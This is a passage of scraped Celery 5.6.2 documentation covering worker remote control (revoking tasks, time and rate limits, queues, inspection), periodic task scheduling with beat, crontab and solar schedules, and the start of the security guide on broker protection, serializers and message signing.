'd9d35e03-2997-42d0-a13e-64a66b88a618',\n])\n\n\nThe GroupResult.revoke method takes advantage of this since version 3.1.\n\nPersistent revokes\n\nRevoking tasks works by sending a broadcast message to all the workers, the workers then keep a list of revoked tasks in memory. When a worker starts up it will synchronize revoked tasks with other workers in the cluster.\n\nThe list of revoked tasks is in-memory so if all workers restart the list of revoked ids will also vanish. If you want to preserve this list between restarts you need to specify a file for these to be stored in by using the –statedb argument to celery worker:\n\n$ celery -A proj worker -l INFO --statedb=/var/run/celery/worker.state\n\n\nor if you use celery multi you want to create one file per worker instance so use the %n format to expand the current node name:\n\ncelery multi start 2 -l INFO --statedb=/var/run/celery/%n.state\n\n\nSee also Variables in file paths\n\nNote that remote control commands must be working for revokes to work. Remote control commands are only supported by the RabbitMQ (amqp) and Redis at this point.\n\nrevoke_by_stamped_headers: Revoking tasks by their stamped headers\npool support:\n\nall, terminate only supported by prefork and eventlet\n\nbroker support:\n\namqp, redis\n\ncommand:\n\ncelery -A proj control revoke_by_stamped_headers <header=value>\n\nThis command is similar to revoke(), but instead of specifying the task id(s), you specify the stamped header(s) as key-value pair(s), and each task that has a stamped header matching the key-value pair(s) will be revoked.\n\nWarning\n\nThe revoked headers mapping is not persistent across restarts, so if you restart the workers, the revoked headers will be lost and need to be mapped again.\n\nWarning\n\nThis command may perform poorly if your worker pool concurrency is high and terminate is enabled, since it will have to iterate over all the running tasks to find the ones with the specified stamped header.\n\nExample\n\n>>> app.control.revoke_by_stamped_headers({'header': 'value'})\n\n>>> app.control.revoke_by_stamped_headers({'header': 'value'}, terminate=True)\n\n>>> app.control.revoke_by_stamped_headers({'header': 'value'}, terminate=True, signal='SIGKILL')\n\nRevoking multiple tasks by stamped headers\n\nAdded in version 5.3.\n\nThe revoke_by_stamped_headers method also accepts a list argument, where it will revoke by several headers or several values.\n\nExample\n\n>> app.control.revoke_by_stamped_headers({\n...    'header_A': 'value_1',\n...    'header_B': ['value_2', 'value_3'],\n})\n\n\nThis will revoke all of the tasks that have a stamped header header_A with value value_1, and all of the tasks that have a stamped header header_B with values value_2 or value_3.\n\nCLI Example\n\n$ celery -A proj control revoke_by_stamped_headers stamped_header_key_A=stamped_header_value_1 stamped_header_key_B=stamped_header_value_2\n\n$ celery -A proj control revoke_by_stamped_headers stamped_header_key_A=stamped_header_value_1 stamped_header_key_B=stamped_header_value_2 --terminate\n\n$ celery -A proj control revoke_by_stamped_headers stamped_header_key_A=stamped_header_value_1 stamped_header_key_B=stamped_header_value_2 --terminate --signal=SIGKILL\n\nTime Limits\n\nAdded in version 2.0.\n\npool support:\n\nprefork/gevent (see note below)\n\nSoft, or hard?\n\nThe time limit is set in two values, soft and hard. The soft time limit allows the task to catch an exception to clean up before it is killed: the hard timeout isn’t catch-able and force terminates the task.\n\nA single task can potentially run forever, if you have lots of tasks waiting for some event that’ll never happen you’ll block the worker from processing new tasks indefinitely. The best way to defend against this scenario happening is enabling time limits.\n\nThe time limit (–time-limit) is the maximum number of seconds a task may run before the process executing it is terminated and replaced by a new process. You can also enable a soft time limit (–soft-time-limit), this raises an exception the task can catch to clean up before the hard time limit kills it:\n\nfrom myapp import app\nfrom celery.exceptions import SoftTimeLimitExceeded\n\n@app.task\ndef mytask():\n    try:\n        do_work()\n    except SoftTimeLimitExceeded:\n        clean_up_in_a_hurry()\n\n\nTime limits can also be set using the task_time_limit / task_soft_time_limit settings. You can also specify time limits for client side operation using timeout argument of AsyncResult.get() function.\n\nNote\n\nTime limits don’t currently work on platforms that don’t support the SIGUSR1 signal.\n\nNote\n\nThe gevent pool does not implement soft time limits. Additionally, it will not enforce the hard time limit if the task is blocking.\n\nChanging time limits at run-time\n\nAdded in version 2.3.\n\nbroker support:\n\namqp, redis\n\nThere’s a remote control command that enables you to change both soft and hard time limits for a task — named time_limit.\n\nExample changing the time limit for the tasks.crawl_the_web task to have a soft time limit of one minute, and a hard time limit of two minutes:\n\n>>> app.control.time_limit('tasks.crawl_the_web',\n                           soft=60, hard=120, reply=True)\n[{'worker1.example.com': {'ok': 'time limits set successfully'}}]\n\n\nOnly tasks that starts executing after the time limit change will be affected.\n\nRate Limits\nChanging rate-limits at run-time\n\nExample changing the rate limit for the myapp.mytask task to execute at most 200 tasks of that type every minute:\n\n>>> app.control.rate_limit('myapp.mytask', '200/m')\n\n\nThe above doesn’t specify a destination, so the change request will affect all worker instances in the cluster. If you only want to affect a specific list of workers you can include the destination argument:\n\n>>> app.control.rate_limit('myapp.mytask', '200/m',\n...            destination=['celery@worker1.example.com'])\n\n\nWarning\n\nThis won’t affect workers with the worker_disable_rate_limits setting enabled.\n\nMax tasks per child setting\n\nAdded in version 2.0.\n\npool support:\n\nprefork\n\nWith this option you can configure the maximum number of tasks a worker can execute before it’s replaced by a new process.\n\nThis is useful if you have memory leaks you have no control over for example from closed source C extensions.\n\nThe option can be set using the workers --max-tasks-per-child argument or using the worker_max_tasks_per_child setting.\n\nMax memory per child setting\n\nAdded in version 4.0.\n\npool support:\n\nprefork\n\nWith this option you can configure the maximum amount of resident memory a worker can execute before it’s replaced by a new process.\n\nThis is useful if you have memory leaks you have no control over for example from closed source C extensions.\n\nThe option can be set using the workers --max-memory-per-child argument or using the worker_max_memory_per_child setting.\n\nAutoscaling\n\nAdded in version 2.2.\n\npool support:\n\nprefork, gevent\n\nThe autoscaler component is used to dynamically resize the pool based on load:\n\nThe autoscaler adds more pool processes when there is work to do,\n\nand starts removing processes when the workload is low.\n\nIt’s enabled by the --autoscale option, which needs two numbers: the maximum and minimum number of pool processes:\n\n--autoscale=AUTOSCALE\n     Enable autoscaling by providing\n     max_concurrency,min_concurrency.  Example:\n       --autoscale=10,3 (always keep 3 processes, but grow to\n      10 if necessary).\n\n\nYou can also define your own rules for the autoscaler by subclassing Autoscaler. Some ideas for metrics include load average or the amount of memory available. You can specify a custom autoscaler with the worker_autoscaler setting.\n\nQueues\n\nA worker instance can consume from any number of queues. By default it will consume from all queues defined in the task_queues setting (that if not specified falls back to the default queue named celery).\n\nYou can specify what queues to consume from at start-up, by giving a comma separated list of queues to the -Q option:\n\n$ celery -A proj worker -l INFO -Q foo,bar,baz\n\n\nIf the queue name is defined in task_queues it will use that configuration, but if it’s not defined in the list of queues Celery will automatically generate a new queue for you (depending on the task_create_missing_queues option).\n\nYou can also tell the worker to start and stop consuming from a queue at run-time using the remote control commands add_consumer and cancel_consumer.\n\nQueues: Adding consumers\n\nThe add_consumer control command will tell one or more workers to start consuming from a queue. This operation is idempotent.\n\nTo tell all workers in the cluster to start consuming from a queue named “foo” you can use the celery control program:\n\n$ celery -A proj control add_consumer foo\n-> worker1.local: OK\n    started consuming from u'foo'\n\n\nIf you want to specify a specific worker you can use the --destination argument:\n\n$ celery -A proj control add_consumer foo -d celery@worker1.local\n\n\nThe same can be accomplished dynamically using the app.control.add_consumer() method:\n\n>>> app.control.add_consumer('foo', reply=True)\n[{u'worker1.local': {u'ok': u\"already consuming from u'foo'\"}}]\n\n>>> app.control.add_consumer('foo', reply=True,\n...                          destination=['worker1@example.com'])\n[{u'worker1.local': {u'ok': u\"already consuming from u'foo'\"}}]\n\n\nBy now we’ve only shown examples using automatic queues, If you need more control you can also specify the exchange, routing_key and even other options:\n\n>>> app.control.add_consumer(\n...     queue='baz',\n...     exchange='ex',\n...     exchange_type='topic',\n...     routing_key='media.*',\n...     options={\n...         'queue_durable': False,\n...         'exchange_durable': False,\n...     },\n...     reply=True,\n...     destination=['w1@example.com', 'w2@example.com'])\n\nQueues: Canceling consumers\n\nYou can cancel a consumer by queue name using the cancel_consumer control command.\n\nTo force all workers in the cluster to cancel consuming from a queue you can use the celery control program:\n\n$ celery -A proj control cancel_consumer foo\n\n\nThe --destination argument can be used to specify a worker, or a list of workers, to act on the command:\n\n$ celery -A proj control cancel_consumer foo -d celery@worker1.local\n\n\nYou can also cancel consumers programmatically using the app.control.cancel_consumer() method:\n\n>>> app.control.cancel_consumer('foo', reply=True)\n[{u'worker1.local': {u'ok': u\"no longer consuming from u'foo'\"}}]\n\nQueues: List of active queues\n\nYou can get a list of queues that a worker consumes from by using the active_queues control command:\n\n$ celery -A proj inspect active_queues\n[...]\n\n\nLike all other remote control commands this also supports the --destination argument used to specify the workers that should reply to the request:\n\n$ celery -A proj inspect active_queues -d celery@worker1.local\n[...]\n\n\nThis can also be done programmatically by using the active_queues() method:\n\n>>> app.control.inspect().active_queues()\n[...]\n\n>>> app.control.inspect(['worker1.local']).active_queues()\n[...]\n\nInspecting workers\n\napp.control.inspect lets you inspect running workers. It uses remote control commands under the hood.\n\nYou can also use the celery command to inspect workers, and it supports the same commands as the app.control interface.\n\n>>> # Inspect all nodes.\n>>> i = app.control.inspect()\n\n>>> # Specify multiple nodes to inspect.\n>>> i = app.control.inspect(['worker1.example.com',\n                            'worker2.example.com'])\n\n>>> # Specify a single node to inspect.\n>>> i = app.control.inspect('worker1.example.com')\n\nDump of registered tasks\n\nYou can get a list of tasks registered in the worker using the registered():\n\n>>> i.registered()\n[{'worker1.example.com': ['tasks.add',\n                          'tasks.sleeptask']}]\n\nDump of currently executing tasks\n\nYou can get a list of active tasks using active():\n\n>>> i.active()\n[{'worker1.example.com':\n    [{'name': 'tasks.sleeptask',\n      'id': '32666e9b-809c-41fa-8e93-5ae0c80afbbf',\n      'args': '(8,)',\n      'kwargs': '{}'}]}]\n\nDump of scheduled (ETA) tasks\n\nYou can get a list of tasks waiting to be scheduled by using scheduled():\n\n>>> i.scheduled()\n[{'worker1.example.com':\n    [{'eta': '2010-06-07 09:07:52', 'priority': 0,\n      'request': {\n        'name': 'tasks.sleeptask',\n        'id': '1a7980ea-8b19-413e-91d2-0b74f3844c4d',\n        'args': '[1]',\n        'kwargs': '{}'}},\n     {'eta': '2010-06-07 09:07:53', 'priority': 0,\n      'request': {\n        'name': 'tasks.sleeptask',\n        'id': '49661b9a-aa22-4120-94b7-9ee8031d219d',\n        'args': '[2]',\n        'kwargs': '{}'}}]}]\n\n\nNote\n\nThese are tasks with an ETA/countdown argument, not periodic tasks.\n\nDump of reserved tasks\n\nReserved tasks are tasks that have been received, but are still waiting to be executed.\n\nYou can get a list of these using reserved():\n\n>>> i.reserved()\n[{'worker1.example.com':\n    [{'name': 'tasks.sleeptask',\n      'id': '32666e9b-809c-41fa-8e93-5ae0c80afbbf',\n      'args': '(8,)',\n      'kwargs': '{}'}]}]\n\nStatistics\n\nThe remote control command inspect stats (or stats()) will give you a long list of useful (or not so useful) statistics about the worker:\n\n$ celery -A proj inspect stats\n\n\nFor the output details, consult the reference documentation of stats().\n\nAdditional Commands\nRemote shutdown\n\nThis command will gracefully shut down the worker remotely:\n\n>>> app.control.broadcast('shutdown') # shutdown all workers\n>>> app.control.broadcast('shutdown', destination='worker1@example.com')\n\nPing\n\nThis command requests a ping from alive workers. The workers reply with the string ‘pong’, and that’s just about it. It will use the default one second timeout for replies unless you specify a custom timeout:\n\n>>> app.control.ping(timeout=0.5)\n[{'worker1.example.com': 'pong'},\n {'worker2.example.com': 'pong'},\n {'worker3.example.com': 'pong'}]\n\n\nping() also supports the destination argument, so you can specify the workers to ping:\n\n>>> ping(['worker2.example.com', 'worker3.example.com'])\n[{'worker2.example.com': 'pong'},\n {'worker3.example.com': 'pong'}]\n\nEnable/disable events\n\nYou can enable/disable events by using the enable_events, disable_events commands. This is useful to temporarily monitor a worker using celery events/celerymon.\n\n>>> app.control.enable_events()\n>>> app.control.disable_events()\n\nWriting your own remote control commands\n\nThere are two types of remote control commands:\n\nInspect command\n\nDoes not have side effects, will usually just return some value found in the worker, like the list of currently registered tasks, the list of active tasks, etc.\n\nControl command\n\nPerforms side effects, like adding a new queue to consume from.\n\nRemote control commands are registered in the control panel and they take a single argument: the current celery.worker.control.ControlDispatch instance. From there you have access to the active Consumer if needed.\n\nHere’s an example control command that increments the task prefetch count:\n\nfrom celery.worker.control import control_command\n\n@control_command(\n    args=[('n', int)],\n    signature='[N=1]',  # <- used for help on the command-line.\n)\ndef increase_prefetch_count(state, n=1):\n    state.consumer.qos.increment_eventually(n)\n    return {'ok': 'prefetch count incremented'}\n\n\nMake sure you add this code to a module that is imported by the worker: this could be the same module as where your Celery app is defined, or you can add the module to the imports setting.\n\nRestart the worker so that the control command is registered, and now you can call your command using the celery control utility:\n\n$ celery -A proj control increase_prefetch_count 3\n\n\nYou can also add actions to the celery inspect program, for example one that reads the current prefetch count:\n\nfrom celery.worker.control import inspect_command\n\n@inspect_command()\ndef current_prefetch_count(state):\n    return {'prefetch_count': state.consumer.qos.value}\n\n\nAfter restarting the worker you can now query this value using the celery inspect program:\n\n$ celery -A proj inspect current_prefetch_count\n\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nCanvas: Designing Work-flows\n\nNext topic\n\nDaemonization\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Workers Guide\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491573,
    "timestamp": "2026-02-23T00:13:49.303Z",
    "title": "Periodic Tasks — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/userguide/periodic-tasks.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Periodic Tasks\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nPeriodic Tasks\n\nIntroduction\n\nTime Zones\n\nEntries\n\nAvailable Fields\n\nCrontab schedules\n\nSolar schedules\n\nStarting the Scheduler\n\nUsing custom scheduler classes\n\nIntroduction\n\ncelery beat is a scheduler; It kicks off tasks at regular intervals, that are then executed by available worker nodes in the cluster.\n\nBy default the entries are taken from the beat_schedule setting, but custom stores can also be used, like storing the entries in a SQL database.\n\nYou have to ensure only a single scheduler is running for a schedule at a time, otherwise you’d end up with duplicate tasks. Using a centralized approach means the schedule doesn’t have to be synchronized, and the service can operate without using locks.\n\nTime Zones\n\nThe periodic task schedules uses the UTC time zone by default, but you can change the time zone used using the timezone setting.\n\nAn example time zone could be Europe/London:\n\ntimezone = 'Europe/London'\n\n\nThis setting must be added to your app, either by configuring it directly using (app.conf.timezone = 'Europe/London'), or by adding it to your configuration module if you have set one up using app.config_from_object. See Configuration for more information about configuration options.\n\nThe default scheduler (storing the schedule in the celerybeat-schedule file) will automatically detect that the time zone has changed, and so will reset the schedule itself, but other schedulers may not be so smart (e.g., the Django database scheduler, see below) and in that case you’ll have to reset the schedule manually.\n\nDjango Users\n\nCelery recommends and is compatible with the USE_TZ setting introduced in Django 1.4.\n\nFor Django users the time zone specified in the TIME_ZONE setting will be used, or you can specify a custom time zone for Celery alone by using the timezone setting.\n\nThe database scheduler won’t reset when timezone related settings change, so you must do this manually:\n\n$ python manage.py shell\n>>> from djcelery.models import PeriodicTask\n>>> PeriodicTask.objects.update(last_run_at=None)\n\n\nDjango-Celery only supports Celery 4.0 and below, for Celery 4.0 and above, do as follow:\n\n$ python manage.py shell\n>>> from django_celery_beat.models import PeriodicTask\n>>> PeriodicTask.objects.update(last_run_at=None)\n\nEntries\n\nTo call a task periodically you have to add an entry to the beat schedule list.\n\nfrom celery import Celery\nfrom celery.schedules import crontab\n\napp = Celery()\n\n@app.on_after_configure.connect\ndef setup_periodic_tasks(sender: Celery, **kwargs):\n    # Calls test('hello') every 10 seconds.\n    sender.add_periodic_task(10.0, test.s('hello'), name='add every 10')\n\n    # Calls test('hello') every 30 seconds.\n    # It uses the same signature of previous task, an explicit name is\n    # defined to avoid this task replacing the previous one defined.\n    sender.add_periodic_task(30.0, test.s('hello'), name='add every 30')\n\n    # Calls test('world') every 30 seconds\n    sender.add_periodic_task(30.0, test.s('world'), expires=10)\n\n    # Executes every Monday morning at 7:30 a.m.\n    sender.add_periodic_task(\n        crontab(hour=7, minute=30, day_of_week=1),\n        test.s('Happy Mondays!'),\n    )\n\n@app.task\ndef test(arg):\n    print(arg)\n\n@app.task\ndef add(x, y):\n    z = x + y\n    print(z)\n\n\nSetting these up from within the on_after_configure handler means that we’ll not evaluate the app at module level when using test.s(). Note that on_after_configure is sent after the app is set up, so tasks outside the module where the app is declared (e.g. in a tasks.py file located by celery.Celery.autodiscover_tasks()) must use a later signal, such as on_after_finalize.\n\nThe add_periodic_task() function will add the entry to the beat_schedule setting behind the scenes, and the same setting can also be used to set up periodic tasks manually:\n\nExample: Run the tasks.add task every 30 seconds.\n\napp.conf.beat_schedule = {\n    'add-every-30-seconds': {\n        'task': 'tasks.add',\n        'schedule': 30.0,\n        'args': (16, 16)\n    },\n}\napp.conf.timezone = 'UTC'\n\n\nNote\n\nIf you’re wondering where these settings should go then please see Configuration. You can either set these options on your app directly or you can keep a separate module for configuration.\n\nIf you want to use a single item tuple for args, don’t forget that the constructor is a comma, and not a pair of parentheses.\n\nUsing a timedelta for the schedule means the task will be sent in 30 second intervals (the first task will be sent 30 seconds after celery beat starts, and then every 30 seconds after the last run).\n\nA Crontab like schedule also exists, see the section on Crontab schedules.\n\nLike with cron, the tasks may overlap if the first task doesn’t complete before the next. If that’s a concern you should use a locking strategy to ensure only one instance can run at a time (see for example Ensuring a task is only executed one at a time).\n\nAvailable Fields\n\ntask\n\nThe name of the task to execute.\n\nTask names are described in the Names section of the User Guide. Note that this is not the import path of the task, even though the default naming pattern is built like it is.\n\nschedule\n\nThe frequency of execution.\n\nThis can be the number of seconds as an integer, a timedelta, or a crontab. You can also define your own custom schedule types, by extending the interface of schedule.\n\nargs\n\nPositional arguments (list or tuple).\n\nkwargs\n\nKeyword arguments (dict).\n\noptions\n\nExecution options (dict).\n\nThis can be any argument supported by apply_async() – exchange, routing_key, expires, and so on.\n\nrelative\n\nIf relative is true timedelta schedules are scheduled “by the clock.” This means the frequency is rounded to the nearest second, minute, hour or day depending on the period of the timedelta.\n\nBy default relative is false, the frequency isn’t rounded and will be relative to the time when celery beat was started.\n\nCrontab schedules\n\nIf you want more control over when the task is executed, for example, a particular time of day or day of the week, you can use the crontab schedule type:\n\nfrom celery.schedules import crontab\n\napp.conf.beat_schedule = {\n    # Executes every Monday morning at 7:30 a.m.\n    'add-every-monday-morning': {\n        'task': 'tasks.add',\n        'schedule': crontab(hour=7, minute=30, day_of_week=1),\n        'args': (16, 16),\n    },\n}\n\n\nThe syntax of these Crontab expressions are very flexible.\n\nSome examples:\n\nExample\n\n\t\n\nMeaning\n\n\n\n\ncrontab()\n\n\t\n\nExecute every minute.\n\n\n\n\ncrontab(minute=0, hour=0)\n\n\t\n\nExecute daily at midnight.\n\n\n\n\ncrontab(minute=0, hour='*/3')\n\n\t\n\nExecute every three hours: midnight, 3am, 6am, 9am, noon, 3pm, 6pm, 9pm.\n\n\n\ncrontab(minute=0,\n\nhour='0,3,6,9,12,15,18,21')\n\n\t\n\nSame as previous.\n\n\n\n\ncrontab(minute='*/15')\n\n\t\n\nExecute every 15 minutes.\n\n\n\n\ncrontab(day_of_week='sunday')\n\n\t\n\nExecute every minute (!) at Sundays.\n\n\n\ncrontab(minute='*',\n\nhour='*', day_of_week='sun')\n\n\t\n\nSame as previous.\n\n\n\ncrontab(minute='*/10',\n\nhour='3,17,22', day_of_week='thu,fri')\n\n\t\n\nExecute every ten minutes, but only between 3-4 am, 5-6 pm, and 10-11 pm on Thursdays or Fridays.\n\n\n\n\ncrontab(minute=0, hour='*/2,*/3')\n\n\t\n\nExecute every even hour, and every hour divisible by three. This means: at every hour except: 1am, 5am, 7am, 11am, 1pm, 5pm, 7pm, 11pm\n\n\n\n\ncrontab(minute=0, hour='*/5')\n\n\t\n\nExecute hour divisible by 5. This means that it is triggered at 3pm, not 5pm (since 3pm equals the 24-hour clock value of “15”, which is divisible by 5).\n\n\n\n\ncrontab(minute=0, hour='*/3,8-17')\n\n\t\n\nExecute every hour divisible by 3, and every hour during office hours (8am-5pm).\n\n\n\n\ncrontab(0, 0, day_of_month='2')\n\n\t\n\nExecute on the second day of every month.\n\n\n\ncrontab(0, 0,\n\nday_of_month='2-30/2')\n\n\t\n\nExecute on every even numbered day.\n\n\n\ncrontab(0, 0,\n\nday_of_month='1-7,15-21')\n\n\t\n\nExecute on the first and third weeks of the month.\n\n\n\ncrontab(0, 0, day_of_month='11',\n\nmonth_of_year='5')\n\n\t\n\nExecute on the eleventh of May every year.\n\n\n\ncrontab(0, 0,\n\nmonth_of_year='*/3')\n\n\t\n\nExecute every day on the first month of every quarter.\n\nSee celery.schedules.crontab for more documentation.\n\nSolar schedules\n\nIf you have a task that should be executed according to sunrise, sunset, dawn or dusk, you can use the solar schedule type:\n\nfrom celery.schedules import solar\n\napp.conf.beat_schedule = {\n    # Executes at sunset in Melbourne\n    'add-at-melbourne-sunset': {\n        'task': 'tasks.add',\n        'schedule': solar('sunset', -37.81753, 144.96715),\n        'args': (16, 16),\n    },\n}\n\n\nThe arguments are simply: solar(event, latitude, longitude)\n\nBe sure to use the correct sign for latitude and longitude:\n\nSign\n\n\t\n\nArgument\n\n\t\n\nMeaning\n\n\n\n\n+\n\n\t\n\nlatitude\n\n\t\n\nNorth\n\n\n\n\n-\n\n\t\n\nlatitude\n\n\t\n\nSouth\n\n\n\n\n+\n\n\t\n\nlongitude\n\n\t\n\nEast\n\n\n\n\n-\n\n\t\n\nlongitude\n\n\t\n\nWest\n\nPossible event types are:\n\nEvent\n\n\t\n\nMeaning\n\n\n\n\ndawn_astronomical\n\n\t\n\nExecute at the moment after which the sky is no longer completely dark. This is when the sun is 18 degrees below the horizon.\n\n\n\n\ndawn_nautical\n\n\t\n\nExecute when there’s enough sunlight for the horizon and some objects to be distinguishable; formally, when the sun is 12 degrees below the horizon.\n\n\n\n\ndawn_civil\n\n\t\n\nExecute when there’s enough light for objects to be distinguishable so that outdoor activities can commence; formally, when the Sun is 6 degrees below the horizon.\n\n\n\n\nsunrise\n\n\t\n\nExecute when the upper edge of the sun appears over the eastern horizon in the morning.\n\n\n\n\nsolar_noon\n\n\t\n\nExecute when the sun is highest above the horizon on that day.\n\n\n\n\nsunset\n\n\t\n\nExecute when the trailing edge of the sun disappears over the western horizon in the evening.\n\n\n\n\ndusk_civil\n\n\t\n\nExecute at the end of civil twilight, when objects are still distinguishable and some stars and planets are visible. Formally, when the sun is 6 degrees below the horizon.\n\n\n\n\ndusk_nautical\n\n\t\n\nExecute when the sun is 12 degrees below the horizon. Objects are no longer distinguishable, and the horizon is no longer visible to the naked eye.\n\n\n\n\ndusk_astronomical\n\n\t\n\nExecute at the moment after which the sky becomes completely dark; formally, when the sun is 18 degrees below the horizon.\n\nAll solar events are calculated using UTC, and are therefore unaffected by your timezone setting.\n\nIn polar regions, the sun may not rise or set every day. The scheduler is able to handle these cases (i.e., a sunrise event won’t run on a day when the sun doesn’t rise). The one exception is solar_noon, which is formally defined as the moment the sun transits the celestial meridian, and will occur every day even if the sun is below the horizon.\n\nTwilight is defined as the period between dawn and sunrise; and between sunset and dusk. You can schedule an event according to “twilight” depending on your definition of twilight (civil, nautical, or astronomical), and whether you want the event to take place at the beginning or end of twilight, using the appropriate event from the list above.\n\nSee celery.schedules.solar for more documentation.\n\nStarting the Scheduler\n\nTo start the celery beat service:\n\n$ celery -A proj beat\n\n\nYou can also embed beat inside the worker by enabling the workers -B option, this is convenient if you’ll never run more than one worker node, but it’s not commonly used and for that reason isn’t recommended for production use:\n\n$ celery -A proj worker -B\n\n\nBeat needs to store the last run times of the tasks in a local database file (named celerybeat-schedule by default), so it needs access to write in the current directory, or alternatively you can specify a custom location for this file:\n\n$ celery -A proj beat -s /home/celery/var/run/celerybeat-schedule\n\n\nNote\n\nTo daemonize beat see Daemonization.\n\nUsing custom scheduler classes\n\nCustom scheduler classes can be specified on the command-line (the --scheduler argument).\n\nThe default scheduler is the celery.beat.PersistentScheduler, that simply keeps track of the last run times in a local shelve database file.\n\nThere’s also the https://pypi.org/project/django-celery-beat/ extension that stores the schedule in the Django database, and presents a convenient admin interface to manage periodic tasks at runtime.\n\nTo install and use this extension:\n\nUse pip to install the package:\n\n$ pip install django-celery-beat\n\n\nAdd the django_celery_beat module to INSTALLED_APPS in your Django project’ settings.py:\n\nINSTALLED_APPS = (\n    ...,\n    'django_celery_beat',\n)\n\n\nNote that there is no dash in the module name, only underscores.\n\nApply Django database migrations so that the necessary tables are created:\n\n$ python manage.py migrate\n\n\nStart the celery beat service using the django_celery_beat.schedulers:DatabaseScheduler scheduler:\n\n$ celery -A proj beat -l INFO --scheduler django_celery_beat.schedulers:DatabaseScheduler\n\n\nNote: You may also add this as the beat_scheduler setting directly.\n\nVisit the Django-Admin interface to set up some periodic tasks.\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nDaemonization\n\nNext topic\n\nRouting Tasks\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Periodic Tasks\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491576,
    "timestamp": "2026-02-23T00:13:49.322Z",
    "title": "Security — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/userguide/security.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Security\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nSecurity\n\nIntroduction\n\nAreas of Concern\n\nBroker\n\nClient\n\nWorker\n\nSerializers\n\nMessage Signing\n\nIntrusion Detection\n\nLogs\n\nTripwire\n\nIntroduction\n\nWhile Celery is written with security in mind, it should be treated as an unsafe component.\n\nDepending on your Security Policy, there are various steps you can take to make your Celery installation more secure.\n\nAreas of Concern\nBroker\n\nIt’s imperative that the broker is guarded from unwanted access, especially if accessible to the public. By default, workers trust that the data they get from the broker hasn’t been tampered with. See Message Signing for information on how to make the broker connection more trustworthy.\n\nThe first line of defense should be to put a firewall in front of the broker, allowing only white-listed machines to access it.\n\nKeep in mind that both firewall misconfiguration, and temporarily disabling the firewall, is common in the real world. Solid security policy includes monitoring of firewall equipment to detect if they’ve been disabled, be it accidentally or on purpose.\n\nIn other words, one shouldn’t blindly trust the firewall either.\n\nIf your broker supports fine-grained access control, like RabbitMQ, this is something you should look at enabling. See for example http://www.rabbitmq.com/access-control.html.\n\nIf supported by your broker backend, you can enable end-to-end SSL encryption and authentication using broker_use_ssl.\n\nClient\n\nIn Celery, “client” refers to anything that sends messages to the broker, for example web-servers that apply tasks.\n\nHaving the broker properly secured doesn’t matter if arbitrary messages can be sent through a client.\n\n[Need more text here]\n\nWorker\n\nThe default permissions of tasks running inside a worker are the same ones as the privileges of the worker itself. This applies to resources, such as; memory, file-systems, and devices.\n\nAn exception to this rule is when using the multiprocessing based task pool, which is currently the default. In this case, the task will have access to any memory copied as a result of the fork() call, and access to memory contents written by parent tasks in the same worker child process.\n\nLimiting access to memory contents can be done by launching every task in a subprocess (fork() + execve()).\n\nLimiting file-system and device access can be accomplished by using chroot, jail, sandboxing, virtual machines, or other mechanisms as enabled by the platform or additional software.\n\nNote also that any task executed in the worker will have the same network access as the machine on which it’s running. If the worker is located on an internal network it’s recommended to add firewall rules for outbound traffic.\n\nSerializers\n\nThe default serializer is JSON since version 4.0, but since it has only support for a restricted set of types you may want to consider using pickle for serialization instead.\n\nThe pickle serializer is convenient as it can serialize almost any Python object, even functions with some work, but for the same reasons pickle is inherently insecure [*], and should be avoided whenever clients are untrusted or unauthenticated.\n\nYou can disable untrusted content by specifying a white-list of accepted content-types in the accept_content setting:\n\nAdded in version 3.0.18.\n\nNote\n\nThis setting was first supported in version 3.0.18. If you’re running an earlier version it will simply be ignored, so make sure you’re running a version that supports it.\n\naccept_content = ['json']\n\n\nThis accepts a list of serializer names and content-types, so you could also specify the content type for json:\n\naccept_content = ['application/json']\n\n\nCelery also comes with a special auth serializer that validates communication between Celery clients and workers, making sure that messages originates from trusted sources. Using Public-key cryptography the auth serializer can verify the authenticity of senders, to enable this read Message Signing for more information.\n\nMessage Signing\n\nCelery can use the https://pypi.org/project/cryptography/ library to sign message using Public-key cryptography, where messages sent by clients are signed using a private key and then later verified by the worker using a public certificate.\n\nOptimally certificates should be signed by an official Certificate Authority, but they can also be self-signed.\n\nTo enable this you should configure the task_serializer setting to use the auth serializer. Enforcing the workers to only accept signed messages, you should set accept_content to [‘auth’]. For additional signing of the event protocol, set event_serializer to auth. Also required is configuring the paths used to locate private keys and certificates on the file-system: the security_key, security_certificate, and security_cert_store settings respectively. You can tweak the signing algorithm with security_digest. If using an encrypted private key, the password can be configured with security_key_password.\n\nWith these configured it’s also necessary to call the celery.setup_security() function. Note that this will also disable all insecure serializers so that the worker won’t accept messages with untrusted content types.\n\nThis is an example configuration using the auth serializer, with the private key and certificate files located in /etc/ssl.\n\napp = Celery()\napp.conf.update(\n    security_key='/etc/ssl/private/worker.key'\n    security_certificate='/etc/ssl/certs/worker.pem'\n    security_cert_store='/etc/ssl/certs/*.pem',\n    security_digest='sha256',\n    task_serializer='auth',\n    event_serializer='auth',\n    accept_content=['auth']\n)\napp.setup_security()\n\n\nNote\n\nWhile relative paths aren’t disallowed, using absolute paths is recommended for these files.\n\nAlso note that the auth serializer won’t encrypt the contents of a message, so if needed this will have to be enabled separately.\n\nIntrusion Detection\n\nThe most important part when defending your systems against intruders is being able to detect if the system has been compromised.\n\nLogs\n\nLogs are usually the first place to look for evidence of security breaches, but they’re useless if they can be tampered with.\n\nA good solution is to set up centralized logging with a dedicated logging server. Access to it should be restricted. In addition to having all of the logs in a single place, if configured correctly, it can make it harder for intruders to tamper with your logs.\n\nThis should be fairly easy to setup using syslog (see also syslog-ng and rsyslog). Celery uses the logging library, and already has support for using syslog.\n\nA tip for the paranoid is to send logs using UDP and cut the transmit part of the logging server’s network cable :-)\n\nTripwire\n\nTripwire is a (now commercial) data integrity 